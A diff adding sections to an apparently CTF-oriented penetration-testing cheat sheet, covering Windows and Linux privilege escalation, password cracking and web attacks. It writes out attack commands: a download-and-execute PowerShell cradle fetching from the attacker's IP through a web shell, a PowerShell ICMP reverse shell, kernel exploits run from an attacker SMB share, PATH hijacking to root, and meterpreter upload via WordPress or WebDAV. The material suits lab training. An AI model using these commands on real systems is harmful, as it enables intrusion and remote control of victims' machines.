+</div>
 <div class="section" id="metasploit-local-exploit-suggestor">
 <h4>Metasploit Local Exploit Suggestor<a class="headerlink" href="#metasploit-local-exploit-suggestor" title="Permalink to this headline">¶</a></h4>
 <p>Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.</p>
@@ -1306,9 +1268,18 @@ cat ~/.bash_logout
 </div>
 </div></blockquote>
 </div>
-<div class="section" id="sherlock-powershell-script">
-<h4>Sherlock Powershell Script<a class="headerlink" href="#sherlock-powershell-script" title="Permalink to this headline">¶</a></h4>
-<p><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in     any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</p>
+<div class="section" id="sherlock-and-powerup-powershell-script">
+<h4>Sherlock and PowerUp Powershell Script<a class="headerlink" href="#sherlock-and-powerup-powershell-script" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</li>
+<li><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.</li>
+</ul>
+<p>The above can be executed by</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>view-source:10.10.10.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://YourIP:8000/Sherlock.ps1&quot;); | powershell -noprofile -
+
+We execute powershell with noprofile and accept the input from stdin
+</pre></div>
+</div>
 </div>
 <div class="section" id="windows-exploit-suggestor">
 <h4>Windows Exploit Suggestor<a class="headerlink" href="#windows-exploit-suggestor" title="Permalink to this headline">¶</a></h4>
@@ -1318,6 +1289,101 @@ cat ~/.bash_logout
 </pre></div>
 </div>
 <p>Possibly, migrate into a new process using post/windows/manage/migrate</p>
+</div>
+<div class="section" id="windows-kernel-exploits">
+<h4>Windows Kernel Exploits<a class="headerlink" href="#windows-kernel-exploits" title="Permalink to this headline">¶</a></h4>
+<p><a class="reference external" href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a> contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath
+
+This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment &#39;My share&#39; TMP /tmp
+
+positional arguments:
+  shareName         name of the share to add
+  sharePath         path of the share to add
+</pre></div>
+</div>
+<p>Assuming, the current directory contains our compiled exploit, we can</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>impacket-smbserver &lt;sharename&gt; `pwd`
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</pre></div>
+</div>
+<p>Once, smbserver is up and running, we can execute code like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami
+
+*Considering shell.php is our php oneliner to execute commands.
+</pre></div>
+</div>
+</div>
+<div class="section" id="icmp-shell">
+<h4>ICMP Shell<a class="headerlink" href="#icmp-shell" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use <a class="reference external" href="https://github.com/inquisb/icmpsh">Simple reverse ICMP Shell</a> However, this requires the executable to be present on the system. There’s a powershell version of <a class="reference external" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">ICMP Reverse Shell</a> Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>powershell -nop -c &quot;$ip=&#39;your_ip&#39;; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;OK&#39;), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(&#39;&#39;), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }&quot;
+</pre></div>
+</div>
+<p>The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won’t be displayed!). Now, there’s a painful way of transferring files to the victim system which is</p>
+<ul class="simple">
+<li>Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the uncessesary code/ comments, this would help us to reduce the length of the base64)</li>
+<li>Utilize the <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1">Add-Content cmdlet</a> to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>Add-Content &lt;filename&gt; &quot;Base64 encoded content&quot;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Once the base64-encoded data is transferred, we can utilize <a class="reference external" href="https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx">certutil</a> from Microsoft to decode the base64-encoded to normal file.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>certutil &lt;-decode/ -encode&gt; &lt;input file&gt; &lt;output file&gt;
+-decode Decode a Base64-encoded file
+-encode Encode a file to Base64
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer managment so, we would be able to get full output of the commands.</li>
+<li>Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let’s say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>$username = &#39;UsernameHere&#39;;
+$password = &#39;PasswordHere&#39;;
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p class="first">Once, we have created a PSCredential, we can use <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command">Invoke-Command</a>  to execute command as that user.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
+-ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn&#39;t work.
+</pre></div>
+</div>
+</li>
+<li><p class="first">Possibly, we can execute the ICMP Shell code to get the shell as the new user.</p>
+</li>
+<li><p class="first">One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.</p>
+<ul class="simple">
+<li>Check powershell processes with Show-Process</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>Show-Process -Name *power* &quot;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Note down  the PID</li>
+<li>Execute shell as the different user</li>
+<li>Stop-Process the previous PID</li>
+</ul>
+</li>
+</ul>
 </div>
 </div>
 <div class="section" id="privilege-escalation-from-g0tm1lk-blog">
@@ -1332,6 +1398,7 @@ cat ~/.bash_logout
 <li>What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.</li>
 <li>What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).</li>
 <li>What are the services running? (netstat -ln)</li>
+<li>Check the entries in the crontab!</li>
 </ul>
 <div class="section" id="what-advanced-linux-file-permissions-are-used">
 <h4>What “Advanced Linux File Permissions” are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Permalink to this headline">¶</a></h4>
@@ -1412,14 +1479,11 @@ find / -group groupname 2&gt; /dev/null
 <h3>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h3>
 <p>If we figure out that a suid binary is running with relative locations ( for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>” )( figured out by running strings on the binary ). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
 <p>so we can create a file in temp:</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;bash -i&quot; &gt;&gt; /tmp/id
-
-or
-
-cp /bin/sh /tmp/id
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id
+chmod +x /tmp/id
 </pre></div>
 </div>
-<div class="highlight-None"><div class="highlight"><pre><span></span>www-data@yummy:/tmp$ cp /bin/sh id
+<div class="highlight-None"><div class="highlight"><pre><span></span>www-data@yummy:/tmp$ echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id
 www-data@yummy:/tmp$ export PATH=/tmp:$PATH
 www-data@yummy:/tmp$ which id
 /tmp/id
@@ -1430,7 +1494,7 @@ root
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 </pre></div>
 </div>
-<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -&gt; Linux searches the filesystem according to its path (here: in /tmp first) -&gt; Our malicious /tmp/scp gets found and executed as root -&gt; A new bash opens with root privileges.</p>
+<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id” -&gt; Linux searches the filesystem according to its path (here: in /tmp first) -&gt; Our malicious /tmp/scp or /tmp/id gets found and executed as root -&gt; A new bash opens with root privileges.</p>
 <p>If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it’s something like:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </pre></div>
@@ -1857,7 +1921,11 @@ PasswordAuthentication yes
 <li>View Source of the web-page (Ctrl+U).</li>
 <li>Inspect element of the web-page (F12).</li>
 <li>See if there is any hint in the title of the web page. (example: /Magic).</li>
+<li>Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!</li>
+<li>Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.</li>
 <li>If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.</li>
+<li>If there’s a page where redirect is happening (for example, <a class="reference external" href="http://example.com">http://example.com</a> or <a class="reference external" href="http://example.com/support.php">http://example.com/support.php</a> redirects us to <a class="reference external" href="http://example.com/login.php">http://example.com/login.php</a>) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.</li>
+<li><a class="reference external" href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">List of HTTP Headers</a> : Quite important when you want to set headers/ cookies etc.</li>
 </ul>
 </div>
 <div class="section" id="htaccess-useragent">
@@ -1942,8 +2010,8 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
 <p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information store.d</p>
 </div>
-<div class="section" id="id13">
-<h4>PHP<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id15">
+<h4>PHP<a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
 <li>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a></li>
 </ul>
@@ -2080,6 +2148,38 @@ crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::
 </pre></div>
 </div>
 </div>
+<div class="section" id="keepass2john">
+<h4>keepass2john<a class="headerlink" href="#keepass2john" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-None"><div class="highlight"><pre><span></span>keepass2john user.kdbx
+user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+</pre></div>
+</div>
+<div class="highlight-None"><div class="highlight"><pre><span></span>john --wordlist wordlist --format=keepass hashfile
+</pre></div>
+</div>
+<p>There are other *2john thingy</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>dmg2john
+gpg2john
+hccap2john
+keepass2john
+keychain2john
+keyring2john
+keystore2john
+kwallet2john
+luks2john
+pfx2john
+putty2john
+pwsafe2john
+racf2john
+rar2john
+ssh2john
+truecrypt_volume2john
+uaf2john
+wpapcap2john
+zip2john
+</pre></div>
+</div>
+</div>
 </div>
 <div class="section" id="encrypted-files">
 <h3>Encrypted Files<a class="headerlink" href="#encrypted-files" title="Permalink to this headline">¶</a></h3>
@@ -2105,6 +2205,54 @@ done
 <div class="highlight-None"><div class="highlight"><pre><span></span>openssl rsautl -decrypt -inkey privatekey.pem -in &lt;encryptedfile&gt; -out key.bin
 </pre></div>
 </div>
+<p>The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>5e14f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a
+</pre></div>
+</div>
+<p>Convert it in to binary using</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>xxd -r -p ciphertext &gt; ciphertext3
+</pre></div>
+</div>
+</div>
+<div class="section" id="rsa-given-q-p-and-e">
+<h4>RSA given q, p and e?<a class="headerlink" href="#rsa-given-q-p-and-e" title="Permalink to this headline">¶</a></h4>
+<p>Taken from <a class="reference external" href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">RSA Given q,p and e</a></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>def egcd(a, b):
+   x,y, u,v = 0,1, 1,0
+   while a != 0:
+       q, r = b//a, b%a
+       m, n = x-u*q, y-v*q
+       b,a, x,y, u,v = a,r, u,v, m,n
+       gcd = b
+   return gcd, x, y
+
+def main():
+
+   p = 1090660992520643446103273789680343
+   q = 1162435056374824133712043309728653
+   e = 65537
+   ct = 299604539773691895576847697095098784338054746292313044353582078965
+
+   # compute n
+   n = p * q
+
+   # Compute phi(n)
+   phi = (p - 1) * (q - 1)
+
+   # Compute modular inverse of e
+   gcd, a, b = egcd(e, phi)
+   d = a
+
+   print( &quot;n:  &quot; + str(d) );
+
+   # Decrypt ciphertext
+   pt = pow(ct, d, n)
+   print( &quot;pt: &quot; + str(pt) )
+
+if __name__ == &quot;__main__&quot;:
+   main()
+</pre></div>
+</div>
 </div>
 </div>
 <div class="section" id="truecrypt-files">
@@ -2116,6 +2264,65 @@ done
 <p>and Veracrypt or cryptsetup to open the file.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>cryptsetup open --type tcrypt &lt;Truecrypt&gt; &lt;MountName&gt;
 </pre></div>
+</div>
+</div>
+<div class="section" id="windows">
+<h3>Windows<a class="headerlink" href="#windows" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="get-childitem-mode-values">
+<h4>Get-ChildItem Mode Values<a class="headerlink" href="#get-childitem-mode-values" title="Permalink to this headline">¶</a></h4>
+<p>‘Mode’ values returned by PowerShell’s Get-ChildItem cmdlet?</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS&gt; gci|select mode,attributes -u
+
+Mode                Attributes
+----                ----------
+d-----               Directory
+d-r---     ReadOnly, Directory
+d----l Directory, ReparsePoint
+-a----                 Archive
+</pre></div>
+</div>
+<p>In any case, the full list is:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>d - Directory
+a - Archive
+r - Read-only
+h - Hidden
+s - System
+l - Reparse point, symlink, etc.
+</pre></div>
+</div>
+</div>
+<div class="section" id="zip-or-unzip-using-only-windows-built-in-capabilities">
+<h4>Zip or unzip using ONLY Windows’ built-in capabilities?<a class="headerlink" href="#zip-or-unzip-using-only-windows-built-in-capabilities" title="Permalink to this headline">¶</a></h4>
+<p>Powershell way</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Add-Type -A System.IO.Compression.FileSystem
+[IO.Compression.ZipFile]::CreateFromDirectory(&#39;foo&#39;, &#39;foo.zip&#39;)
+[IO.Compression.ZipFile]::ExtractToDirectory(&#39;foo.zip&#39;, &#39;bar&#39;)
+</pre></div>
+</div>
+</div>
+<div class="section" id="alternate-data-stream">
+<h4>Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Permalink to this headline">¶</a></h4>
+<p>Sometimes, <a class="reference external" href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">Alternate Data Stream</a> can be used to hide data in streams.</p>
+<p>The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>PS &gt; Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+Filename: C:\Users\Administrator\example.zip
+
+Stream             Length
+------             -------
+:$DATA             8
+pass.txt           4
+</pre></div>
+</div>
+<p>Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+The password is Passw0rd!
+</pre></div>
+</div>
+<p>Check a directory for ADS?</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>gci -recurse | % { gi $_.FullName -stream * } | where stream -ne &#39;:$Data&#39;
+</pre></div>
+</div>
 </div>
 </div>
 <div class="section" id="others">
@@ -2311,13 +2518,19 @@ base64 -d flair &gt; flair.jpg
 <blockquote>
 <div><ul>
 <li><p class="first">Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -&gt; permissions check “Use the PHP code text for.</p>
-<p>Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down. Taken from &lt;<a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">https://g0blin.co.uk/droopy-vulnhub-writeup/</a>&gt;
+<p>Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from <a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">Droopy Vulnhub WriteUp</a>
 Drupal settings file location: /var/www/html/sites/default/settings.php</p>
+</li>
+<li><p class="first">WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</p>
 </li>
 </ul>
 </div></blockquote>
 <ul>
-<li><p class="first">If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.</p>
+<li><p class="first">If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf</p>
+</li>
+<li><p class="first">Running Asterisk/ Elastix/ FreePBX or any PBX, probably try <a class="reference external" href="https://github.com/EnableSecurity/sipvicious">SIPVicious</a>  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\IPpanel should provide us valid extensions.</p>
+</li>
+<li><p class="first">Sharepoint running? Probably, check <a class="reference external" href="https://github.com/sensepost/SPartan">SPartan</a> Frontpage and Sharepoint fingerprinting and attack tool and <a class="reference external" href="https://github.com/0rigen/SharePwn">SharePwn</a> SharePoint Security Auditor.</p>
 </li>
 <li><p class="first">Want to send a email via the SMTP server something like SMTP-Open-Relay utilize <a class="reference external" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> Swiss Army Knife for SMTP.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body &quot;Hey Buddy How are you doing&quot; --header &quot;Subject: Hello! Long time&quot;
@@ -2331,6 +2544,58 @@ Drupal settings file location: /var/www/html/sites/default/settings.php</p>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>unshadow passwd shadown
 </pre></div>
 </div>
+</div></blockquote>
+<ul class="simple">
+<li>If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav to see which files are allowed</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>davtest -url http://10.10.10.15/
+********************************************************
+ Testing DAV connection
+OPEN          SUCCEED:                http://10.10.10.15
+********************************************************
+NOTE  Random string for this session: E3u9ISnNswYes0
+********************************************************
+ Creating directory
+MKCOL         SUCCEED:                Created http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
+********************************************************
+ Sending test files
+PUT   pl      SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+PUT   asp     FAIL
+PUT   aspx    FAIL
+PUT   cgi     FAIL
+PUT   html    SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+PUT   cfm     SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+PUT   jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+PUT   shtml   FAIL
+PUT   php     SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+PUT   jsp     SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+PUT   txt     SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+********************************************************
+ Checking for test file execution
+EXEC  pl      FAIL
+EXEC  html    SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+EXEC  cfm     FAIL
+EXEC  jhtml   FAIL
+EXEC  php     FAIL
+EXEC  jsp     FAIL
+EXEC  txt     SUCCEED:        http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+</pre></div>
+</div>
+<p>Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a php meterpreter in a text file and then MOVE the .txt file to .php and execute the php file.</p>
 </div></blockquote>
 <ul>
 <li><p class="first">In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let’s say the ramdump was saved at</p>
@@ -2374,7 +2639,23 @@ print &quot;* * * * * root /bin/bash /home/username/evilscript&quot;
 <div><ul class="simple">
 <li>binascii.unhexlify(hexstr) to convert hex to string</li>
 <li>base64.decodestring(str) to decode base64 string</li>
+<li>Convert number to hex</li>
 </ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>hex(15)
+&#39;0xf&#39;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Convert hex to decimal</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>s = &quot;6a48f82d8e828ce82b82&quot;
+i = int(s, 16)
+</pre></div>
+</div>
+</div></blockquote>
 </div></blockquote>
 <ul class="simple">
 <li>Getting out of more</li>
@@ -2392,7 +2673,15 @@ more ~/text.txt
 exit 0
 </pre></div>
 </div>
-<p>In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell</p>
+<p>In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.</p>
+</div></blockquote>
+<ul class="simple">
+<li>List all the files together</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>find /home -type f -printf &quot;%f\t%p\t%u\%g\t%m\n&quot; 2&gt;/dev/null | column -t
+</pre></div>
+</div>
 </div></blockquote>
 </div></blockquote>
 </div>
@@ -2439,6 +2728,332 @@ exit 0
 <li><a class="reference external" href="https://github.com/g0tmi1k/exe2hex">exe2hex</a> : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell).</li>
 <li><a class="reference external" href="https://github.com/secabstraction/PowerCat">Powercat</a> : A PowerShell TCP/IP swiss army knife that works with Netcat &amp; Ncat</li>
 </ul>
+</div>
+<div class="section" id="appendix-i-local-file-inclusion">
+<h2>Appendix-I : Local File Inclusion<a class="headerlink" href="#appendix-i-local-file-inclusion" title="Permalink to this headline">¶</a></h2>
+<p>Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.</p>
+<div class="section" id="tools">
+<h3>Tools<a class="headerlink" href="#tools" title="Permalink to this headline">¶</a></h3>
+<p>To test LFI, RFI, we can also use <a class="reference external" href="http://tools.kali.org/web-applications/uniscan">Uniscan</a> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>uniscan -h
+OPTIONS:
+  -h  help
+  -u  &lt;url&gt; example: https://www.example.com/
+  -f  &lt;file&gt; list of url&#39;s
+  -b  Uniscan go to background
+  -q  Enable Directory checks
+  -w  Enable File checks
+  -e  Enable robots.txt and sitemap.xml check
+  -d  Enable Dynamic checks
+  -s  Enable Static checks
+  -r  Enable Stress checks
+  -i  &lt;dork&gt; Bing search
+  -o  &lt;dork&gt; Google search
+  -g  Web fingerprint
+  -j  Server fingerprint
+
+usage:
+[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
+[2] perl ./uniscan.pl -f sites.txt -bqweds
+[3] perl ./uniscan.pl -i uniscan
+[4] perl ./uniscan.pl -i &quot;ip:xxx.xxx.xxx.xxx&quot;
+[5] perl ./uniscan.pl -o &quot;inurl:test&quot;
+[6] perl ./uniscan.pl -u https://www.example.com/ -r
+</pre></div>
+</div>
+<p>There’s another tool called <a class="reference external" href="https://tools.kali.org/web-applications/fimap">fimap</a>. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.</p>
+<div class="admonition note">
